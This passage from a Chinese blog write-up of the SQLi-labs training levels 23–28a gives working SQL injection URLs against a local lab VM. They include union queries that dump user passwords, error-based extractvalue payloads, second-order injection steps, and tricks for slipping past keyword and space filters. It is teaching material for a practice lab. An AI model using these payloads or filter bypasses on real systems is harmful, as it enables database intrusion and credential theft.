<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-23/?id=-1' union select 1,(select group_concat(password) FROM security.users),3'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>注：这一关还可以使用  extractvalue() 和 UpdateXml() 函数进行报错注入，使用延时注入。</p>
<p><img src="https://i.loli.net/2020/02/10/hIxtvPBi7kLepMV.png" alt="less23-7.png"></p>
<h2 id="Less-24"><a href="#Less-24" class="headerlink" title="Less 24"></a>Less 24</h2><p>二次注入之存储注入</p>
<hr>
<h3 id="基础知识-7"><a href="#基础知识-7" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="什么是二次注入"><a href="#什么是二次注入" class="headerlink" title="什么是二次注入"></a>什么是二次注入</h4><p>所谓的二次注入是指，读取已经存储到数据库的用户输入，然后再将该输入带到 sql 语句中执行。<br>二次注入是 sql 注入的一种，但是比普通 sql 注入利用更加困难，利用门槛更高。普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询。相对于一次注入漏洞而言，二次注入漏洞更难以被发现，但是它却具有与一次注入攻击漏洞相同的攻击威力。</p>
<h4 id="二次注入原理"><a href="#二次注入原理" class="headerlink" title="二次注入原理"></a>二次注入原理</h4><p>二次注入的原理，在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 函数或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是脏数据。<br>在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。</p>
<p><img src="https://image.3001.net/images/20180331/15224810526050.png" alt=" "></p>
<h3 id="注入步骤-10"><a href="#注入步骤-10" class="headerlink" title="注入步骤"></a>注入步骤</h3><ol>
<li><strong>注册一个新用户</strong></li>
</ol>
<p><img src="https://i.loli.net/2020/02/13/qy3Eh5Soa4A7sPm.png" alt="less24-1.png"></p>
<p><img src="https://i.loli.net/2020/02/13/h6J4BGTxUZLwYMF.png" alt="less24-2.png"></p>
<p><img src="https://i.loli.net/2020/02/13/ZdNzFtG1cWn4BHp.png" alt="less24-3.png"></p>
<ol start="2">
<li><strong>登录用户，修改密码</strong></li>
</ol>
<p><img src="https://i.loli.net/2020/02/13/eYcD23jvAwyE1Na.png" alt="less24-4.png"></p>
<ol start="3">
<li><strong>再次查看数据库</strong></li>
</ol>
<p><img src="https://i.loli.net/2020/02/13/3p4TOzHWmgb2RZE.png" alt="less24-5.png"></p>
<h2 id="Less25"><a href="#Less25" class="headerlink" title="Less25"></a>Less25</h2><p>报错注入，过滤了 or 和 and</p>
<hr>
<h3 id="基础知识-8"><a href="#基础知识-8" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="绕过-or-和-and-过滤有如下几种方法："><a href="#绕过-or-和-and-过滤有如下几种方法：" class="headerlink" title="绕过 or 和 and 过滤有如下几种方法："></a>绕过 or 和 and 过滤有如下几种方法：</h4><ul>
<li>大小写变型</li>
<li>编码，hex，urlencode</li>
<li>添加注释：/<em>or</em>/</li>
<li>利用符号: and=&amp;&amp; or=||</li>
</ul>
<p>注：在 url 中字符 “&amp;” 表示参数分隔符，所以在注入过程中要将 “&amp;&amp;” 进行 urlencode</p>
<h3 id="注入步骤-11"><a href="#注入步骤-11" class="headerlink" title="注入步骤"></a>注入步骤</h3><ol>
<li><strong>测试 or 和 and 大小写</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-25/?id=1' Or 1=1%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-25/?id=1' AnD 1=1%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2020/02/14/GNLw5WRJ41iTUfc.png" alt="less25-1.png"></p>
<ol start="2">
<li><strong>测试符号 &amp;&amp; 和 ||</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-25/?id=1' || 1=1%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2020/02/14/uzSleZgCJGcODjL.png" alt="less25-2.png"></p>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-25/?id=1' %26%26 1=1%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2020/02/14/qDHv49jOicGB1N5.png" alt="less25-3.png"></p>
<ol start="3">
<li><strong>报错注入</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-25/?id=1' %26%26 extractvalue(1,concat(0x7e,database()))%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2020/02/14/N5aOTmXZ1jzCHrp.png" alt="less25-4.png"></p>
<h2 id="Less25a"><a href="#Less25a" class="headerlink" title="Less25a"></a>Less25a</h2><p>这一关同样是过滤了 or 和 and，同时没有输出错误项。所以这一关可直接使用联合注入和延时注入。</p>
<hr>
<ol>
<li><strong>联合注入</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-25a/?id=-1 union select 1,database(),3%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2020/02/16/Gd9NxZEMp1XvBzO.png" alt="less25a-1.png"></p>
<ol start="2">
<li><strong>or 和 and 利用</strong></li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-25a/?id=-1 || 1=1%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://i.loli.net/2020/02/16/my3EGUOpKXgxoWh.png" alt="less25a-2.png"></p>
<h2 id="Less26"><a href="#Less26" class="headerlink" title="Less26"></a>Less26</h2><p>基于错误_GET_过滤空格/注释_单引号_字符型注入。这里将 “or”、“and”、“/*”、“#”、“–”、“/” 等特殊符号都进行了过滤了。</p>
<hr>
<p>绕过空格：</p>
<pre class="line-numbers language-text"><code class="language-text">%09 TAB键（水平）
%0a 新建一行
%0c 新的一页
%0d return功能
%0b TAB键（垂直）
%a0 空格<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ol>
<li><p><strong>这关的SQL语句如下</strong></p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token constant">SELECT</span> <span class="token operator">*</span> <span class="token constant">FROM</span> users <span class="token constant">WHERE</span> id<span class="token operator">=</span><span class="token string">'$id'</span> <span class="token constant">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p><strong>这里无法使用注释符，可以使用 “单引号” 来闭合SQL语句</strong></p>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-26/?id=1'%a0||'1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ol>
<p>执行的SQL语句如下：</p>
<pre class="line-numbers language-text"><code class="language-text">SELECT * FROM users WHERE id='1' ||'1' LIMIT 0,1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ol start="3">
<li><strong>联合注入</strong><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-26/?id=1000'%a0union%a0select%a01,2,3%a0||'1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
这里 “-” 被过滤掉了，所以 id 值填 “-1” 不生效</li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-26/?id=_1'%a0union%a0select%a01,2,3%a0||'1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>具体不知是什么原因 “&amp;&amp;” 不生效，这里可以将 “&amp;” 进行 url 编码</p>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-26/?id=_1'%a0union%a0select%a01,2,3%a0%26%26'1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="Less26a"><a href="#Less26a" class="headerlink" title="Less26a"></a>Less26a</h2><p>这关与 26 的区别在于，sql 语句添加了一个括号，同时在 sql 语句执行抛出错误后并不在前台页面输出。</p>
<hr>
<ol>
<li><p><strong>这关的SQL语句如下</strong></p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token constant">SELECT</span> <span class="token operator">*</span> <span class="token constant">FROM</span> users <span class="token constant">WHERE</span> id<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'$id'</span><span class="token punctuation">)</span> <span class="token constant">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p><strong>闭合SQL语句</strong></p>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-26a/?id=1')||('1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p><strong>联合注入</strong><br><a href="http://192.168.150.128/sqli-labs-master/Less-26a/?id=1000%27)union%a0select%a01,2,3||" target="_blank" rel="noopener">http://192.168.150.128/sqli-labs-master/Less-26a/?id=1000%27)union%a0select%a01,2,3||</a>(%271</p>
</li>
</ol>
<h2 id="Less27"><a href="#Less27" class="headerlink" title="Less27"></a>Less27</h2><p>这关将 union，select 和 26 关过滤掉的字符。此处我们依旧和 26 关的方式是一样的，只需要将 union 和 select 改为大小写混合就可以突破。</p>
<hr>
<ol>
<li><strong>联合注入</strong><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-27/?id=_1'%a0UnIon%a0SeLect%a01,2,3||'1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ol>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-27/?id=_1'%a0uniunionon%a0SeLect%a01,2,3||'1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="Less27a"><a href="#Less27a" class="headerlink" title="Less27a"></a>Less27a</h2><p>本关与 27 关的区别在于对于 id 的处理，这里用的是 “双引号“ ，同时 mysql 的错误不会在前端页面显示。</p>
<hr>
<ol>
<li><p><strong>这关的SQL语句如下</strong></p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token constant">SELECT</span> <span class="token operator">*</span> <span class="token constant">FROM</span> users <span class="token constant">WHERE</span> id<span class="token operator">=</span>”<span class="token variable">$id</span>“ <span class="token constant">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p><strong>联合注入</strong></p>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-27a/?id=1000"%a0UNiOn%a0SeLecT%a01,2,3||"1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ol>
<h2 id="Less28"><a href="#Less28" class="headerlink" title="Less28"></a>Less28</h2><p>本关与 27 关的区别在于对于 id 的处理，这里用的是 “’)” ，同时 mysql 的错误不会在前端页面显示。</p>
<hr>
<ol>
<li><p><strong>这关的SQL语句如下</strong></p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token constant">SELECT</span> <span class="token operator">*</span> <span class="token constant">FROM</span> users <span class="token constant">WHERE</span> id<span class="token operator">=</span>（‘<span class="token variable">$id</span>’） <span class="token constant">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p><strong>联合注入</strong></p>
<pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-28/?id=100')%a0UNiOn%a0SeLecT%a01,2,3||('1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ol>
<h2 id="Less28a"><a href="#Less28a" class="headerlink" title="Less28a"></a>Less28a</h2><p>本关与 28 基本一致，只是过滤条件少了几个。</p>
<hr>
<ol>
<li><strong>联合注入</strong><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-28a/?id=100')%a0UNiOn%a0SeLecT%a01,2,3||('1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ol>
<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><hr>
<h3 id="Less1-1"><a href="#Less1-1" class="headerlink" title="Less1"></a>Less1</h3><p><a href="https://www.cnblogs.com/omnis/p/8311556.html" target="_blank" rel="noopener">【sqli-labs】 less1 GET - Error based - Single quotes - String(GET型基于错误的单引号字符型注入)</a></p>
<p><a href="https://blog.csdn.net/sdb5858874/article/details/80656123" target="_blank" rel="noopener">SQL注入——联合查询和报错注入</a></p>
<p><a href="https://www.jianshu.com/p/5903e8c002ed" target="_blank" rel="noopener">MYSQL中information_schema简介</a></p>
<p><a href="https://www.cnblogs.com/xuthus/p/9450805.html" target="_blank" rel="noopener">SQL注入 (1) SQL注入类型介绍</a></p>
<h3 id="Less2-1"><a href="#Less2-1" class="headerlink" title="Less2"></a>Less2</h3><p><a href="https://www.cnblogs.com/omnis/p/8313148.html" target="_blank" rel="noopener">【sqli-labs】 less2 GET - Error based - Intiger based (基于错误的GET整型注入)</a></p>
<h3 id="Less3-1"><a href="#Less3-1" class="headerlink" title="Less3"></a>Less3</h3><p><a href="https://www.cnblogs.com/omnis/p/8313233.html" target="_blank" rel="noopener">【sqli-labs】 less3 GET - Error based - Single quotes with twist string(基于错误的GET单引号变形字符型注入)</a></p>
<h3 id="Less4-1"><a href="#Less4-1" class="headerlink" title="Less4"></a>Less4</h3><p><a href="https://www.cnblogs.com/omnis/p/8313314.html" target="_blank" rel="noopener">【sqli-labs】 less4 GET - Error based - Double Quotes - String (基于错误的GET双引号字符型注入)</a></p>
<h3 id="Less5-1"><a href="#Less5-1" class="headerlink" title="Less5"></a>Less5</h3><p><a href="https://www.cnblogs.com/omnis/p/8313608.html" target="_blank" rel="noopener">【sqli-labs】 less5 GET - Double Injection - Single Quotes - String (双查询注入GET单引号字符型注入)</a></p>
<p><a href="https://bbs.ichunqiu.com/thread-27209-1-43.html" target="_blank" rel="noopener">Double SQL Injection（双查询注入）</a></p>
<p><a href="https://www.cnblogs.com/litlife/p/8472323.html" target="_blank" rel="noopener">Floor报错原理分析</a></p>
<h3 id="Less6-1"><a href="#Less6-1" class="headerlink" title="Less6"></a>Less6</h3><p><a href="https://www.cnblogs.com/omnis/p/8314700.html" target="_blank" rel="noopener">【sqli-labs】 less6 GET - Double Injection - Double Quotes - String (双注入GET双引号字符型注入)</a></p>
<h3 id="Less7-1"><a href="#Less7-1" class="headerlink" title="Less7"></a>Less7</h3><p><a href="https://www.php.cn/mysql-tutorials-401995.html" target="_blank" rel="noopener">mysql5.7导出数据提示–secure-file-priv选项问题的解决方法</a></p>
<p><a href="https://blog.csdn.net/baidu_37576427/article/details/76160309" target="_blank" rel="noopener">SQLI labs 第七课（神游太虚）</a></p>
<p><a href="https://www.cnblogs.com/omnis/p/8315087.html" target="_blank" rel="noopener">【sqli-labs】 less7 GET - Dump into outfile - String (导出文件GET字符型注入)</a></p>
<h3 id="Less8-1"><a href="#Less8-1" class="headerlink" title="Less8"></a>Less8</h3><p><a href="https://www.cnblogs.com/omnis/p/8318639.html" target="_blank" rel="noopener">【sqli-labs】 less8 GET - Blind - Boolian Based - Single Quotes (基于布尔的单引号GET盲注)</a></p>
<h3 id="Less9-1"><a href="#Less9-1" class="headerlink" title="Less9"></a>Less9</h3><p><a href="https://www.cnblogs.com/omnis/p/8318743.html" target="_blank" rel="noopener">【sqli-labs】 less9 GET - Blind - Time based. - Single Quotes (基于时间的GET单引号盲注)</a></p>
<h3 id="Less10-1"><a href="#Less10-1" class="headerlink" title="Less10"></a>Less10</h3><p><a href="https://www.cnblogs.com/omnis/p/8318762.html" target="_blank" rel="noopener">【sqli-labs】 less10 GET - Blind - Time based. - Double quotes (基于时间的双引号盲注)</a></p>
<h3 id="Less11-1"><a href="#Less11-1" class="headerlink" title="Less11"></a>Less11</h3><p><a href="http://www.cnblogs.com/lcamry/category/846064.html" target="_blank" rel="noopener">mysql注入天书</a></p>
<p><a href="https://blog.csdn.net/wang1006008051/article/details/78157325" target="_blank" rel="noopener">html中form表单的使用方法和介绍</a></p>
<p><a href="https://www.jianshu.com/p/694ebe354c28" target="_blank" rel="noopener">HTML form表单</a></p>
<h3 id="Less17-1"><a href="#Less17-1" class="headerlink" title="Less17"></a>Less17</h3><p><a href="https://www.zhihu.com/question/275933480" target="_blank" rel="noopener">在调用updatexml显错注入的时候为什么要用concat函数？</a></p>
<p><a href="https://www.cnblogs.com/-zhong/p/10927731.html" target="_blank" rel="noopener">Updatexml函数再mysql中的作用</a></p>
<p><a href="http://www.blogjava.net/chenpengyi/archive/2006/07/11/57578.html" target="_blank" rel="noopener">MySQL 5.1 提供XML内置支持(XPath)</a></p>
<h3 id="Less18-1"><a href="#Less18-1" class="headerlink" title="Less18"></a>Less18</h3><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/User-Agent" target="_blank" rel="noopener">User-Agent</a></p>
<p><a href="https://zh.wikipedia.org/wiki/%E8%B6%85%E6%96%87%E6%9C%AC%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE" target="_blank" rel="noopener">超文本传输协议</a></p>
<p><a href="https://www.jianshu.com/p/c5cf6a1967d1" target="_blank" rel="noopener">HTTP请求头之User-Agent</a></p>
<p><a href="https://baike.baidu.com/item/%E6%8E%92%E7%89%88%E5%BC%95%E6%93%8E/8371898?fromtitle=gecko&amp;fromid=7348782" target="_blank" rel="noopener">排版引擎</a></p>
<p><a href="https://www.bilibili.com/video/av68787122?p=1" target="_blank" rel="noopener">sql注入之sqli-labs系列教程(less18-22)</a></p>
<h3 id="Less19-1"><a href="#Less19-1" class="headerlink" title="Less19"></a>Less19</h3><p><a href="https://75.team/post/everything-you-could-ever-want-to-know-and-more-about-controlling-the-referer-header-fastmail-blog.html" target="_blank" rel="noopener">关于控制 Referer 你想要知道的一切（和更多的）</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/33359713" target="_blank" rel="noopener">Referer伪造，防盗链与反盗链，5分钟科普文，含实战源码，收藏！</a></p>
<p><a href="https://www.ruanyifeng.com/blog/2019/06/http-referer.html" target="_blank" rel="noopener">HTTP Referer 教程</a></p>
<h3 id="Less20-1"><a href="#Less20-1" class="headerlink" title="Less20"></a>Less20</h3><p><a href="https://zh.wikipedia.org/wiki/Cookie" target="_blank" rel="noopener">Cookie</a></p>
<p><a href="https://bubkoo.com/2014/04/21/http-cookies-explained/" target="_blank" rel="noopener">HTTP cookies 详解</a></p>
<p><a href="http://www.itboth.com/d/Vvmmiy/sqli-labs-sql" target="_blank" rel="noopener">通过sqli-labs学习sql注入——基础挑战之less11-22</a></p>
<h3 id="Less21-1"><a href="#Less21-1" class="headerlink" title="Less21"></a>Less21</h3><p><a href="http://www.pianshen.com/article/4049219913/" target="_blank" rel="noopener">Sqli-Lab | Less 21-23</a></p>
<p><a href="https://warwolf767.gitbooks.io/sqli-lab/content/less_21_-_less_30.html" target="_blank" rel="noopener">SQLI-LAB 的 实战记录(Less 21 - Less 30)</a></p>
<h3 id="Less23-1"><a href="#Less23-1" class="headerlink" title="Less23"></a>Less23</h3><p><a href="https://www.cnblogs.com/omnis/p/8361047.html" target="_blank" rel="noopener">【sqli-labs】 less23 Error based - strip comments (GET型基于错误的去除注释的注入)</a></p>
<p><a href="https://zhzhdoai.github.io/2018/12/22/sqlilabs23-28/" target="_blank" rel="noopener">sqlilabs23-28</a></p>
<p><a href="https://blog.csdn.net/qq_21500173/article/details/51964908" target="_blank" rel="noopener">Less - 23 Error Based- no comments</a></p>
<p><a href="https://blog.csdn.net/Fly_hps/article/details/80285353" target="_blank" rel="noopener">sqli-labs————less 23（高级注入篇）</a></p>
<h3 id="Less24"><a href="#Less24" class="headerlink" title="Less24"></a>Less24</h3><p><a href="https://www.freebuf.com/articles/web/167089.html" target="_blank" rel="noopener">由Three Hit聊聊二次注入</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/39917830" target="_blank" rel="noopener">SQL注入（二次注入）</a></p>
<h3 id="Less25-1"><a href="#Less25-1" class="headerlink" title="Less25"></a>Less25</h3><p><a href="https://www.cnblogs.com/julin-peng/p/4237791.html" target="_blank" rel="noopener">URL中“#” “？” &amp;“”号的作用</a></p>
<p><a href="https://www.jianshu.com/p/0e285c2bbfba" target="_blank" rel="noopener">sql-labs less25 or and 过滤</a></p>
<h3 id="Less26-1"><a href="#Less26-1" class="headerlink" title="Less26"></a>Less26</h3><p><a href="https://blog.csdn.net/pcyph/article/details/45010609" target="_blank" rel="noopener">网址URL中特殊字符转义编码</a></p>
<p><a href="https://www.cnblogs.com/lcamry/p/5762992.html" target="_blank" rel="noopener">Sqli-labs less 26</a></p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>
            </div>
            <hr/>

            

            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">

<div id="article-share">
    
    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
    
</div>

<script src="/libs/share/js/social-share.min.js"></script>

            <div class="reprint">
                <p>
                    <span class="reprint-tip">
                        <i class="fa fa-exclamation-circle"></i>&nbsp;&nbsp;转载请注明:
                    </span>
                    <a href="https://github.com/hhkk2334/hhkk2334.github.io" class="b-link-green">Junk Blog</a>
                    <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
                    <a href="/2020/02/08/Sqli-labs通关笔记/" class="b-link-green">Sqli-labs通关笔记</a>
                </p>
            </div>
        </div>
    </div>

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2020/03/21/xss-labs通关笔记/">
                    <div class="card-image">
                        
                        <img src="https://i.loli.net/2020/03/22/uSflaqOVEc24hrA.png" class="responsive-img" alt="xss-labs通关笔记">
                        
                        <span class="card-title">xss-labs通关笔记</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary">简介xss 表示 Cross Site Scripting (跨站脚本攻击)，它与 SQL 注入攻击类似，SQL 注入攻击中以 SQL 语句作为用户输入，从而达到查询/修改/删除数据的目的，而在 xss 攻击中，通过插入恶意脚本，实现对用户</div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-03-21
                        </span>
                        <span class="publish-author">
                            
                            <i class="fa fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/Web-security/" class="post-category" target="_blank">
                                    Web security
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/xss/" target="_blank">
                        <span class="chip bg-color">xss</span>
                    </a>
                    
                    <a href="/tags/xss-labs/" target="_blank">
                        <span class="chip bg-color">xss-labs</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2020/02/03/ms17-010/">
                    <div class="card-image">
                        
                        <img src="https://tse1.mm.bing.net/th?id=OIP.Y2Gi0l81__u7QiWy0YmwAQHaEK&amp;pid=15.1" class="responsive-img" alt="ms17-010">
                        
                        <span class="card-title">ms17-010</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary">漏洞复现环境
靶机：windows 7 SP1（64位）、windows 7 SP1（32位）
渗透系统：kali linux
渗透工具：metasploit v5.0.8-dev
扫描目标是否存在漏洞
使用模块 auxiliary/sca</div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-02-03
                            </span>
                        <span class="publish-author">
                            
                            <i class="fa fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/system-security/" class="post-category" target="_blank">
                                    system security
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/windows/" target="_blank">
                        <span class="chip bg-color">windows</span>
                    </a>
                    
                    <a href="/tags/smb/" target="_blank">
                        <span class="chip bg-color">smb</span>
                    </a>
                    
                    <a href="/tags/RCE/" target="_blank">
                        <span class="chip bg-color">RCE</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>
</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('120')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + '来源: Junk Blog<br />'
            + '作者: Trash Can,Trash Can<br />'
            + '链接: <a href="' + url + '">' + url + '</a><br />'
            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>

    </div>
    <div class="col l3 hide-on-med-and-down">
        <div class="toc-widget">
            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            // headingsOffset: -205,
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });
    });
</script>
    

</main>


<footer class="page-footer bg-color">
    <div class="container row center-align">
        <div class="col s12 m8 l8 copy-right" >
             Copyright&nbsp;&copy;
            <span id="year">年份</span>
            <a href="https://github.com/hhkk2334/hhkk2334.github.io" target="_blank">Trash Can,Trash Can</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                class="white-color">66.1k</span>&nbsp;字
               
            
			
                <br>
                
                <span id="busuanzi_container_site_pv">
                    <i class="fa fa-heart-o"></i>
                    本站总访问量 <span id="busuanzi_value_site_pv" class="white-color"></span>
                </span>
                
                
                <span id="busuanzi_container_site_uv">
                    <i class="fa fa-users"></i>
                    次,&nbsp;访客数 <span id="busuanzi_value_site_uv" class="white-color"></span> 人.
                </span>
                
            
        </div>
		<div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/hhkk2334/hhkk2334.github.io" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fa fa-github"></i>
    </a>



    <a href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=RHZxdXFydXJ9dHEENTVqJysp" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fa fa-envelope-open"></i>
    </a>



    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2515616905" class="tooltipped" data-tooltip="QQ联系我: 2515616905" data-position="top" data-delay="50">
        <i class="fa fa-qq"></i>
    </a>


</div>
    </div>
</footer>

<div class="progress-bar"></div>


<!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;搜索</span>
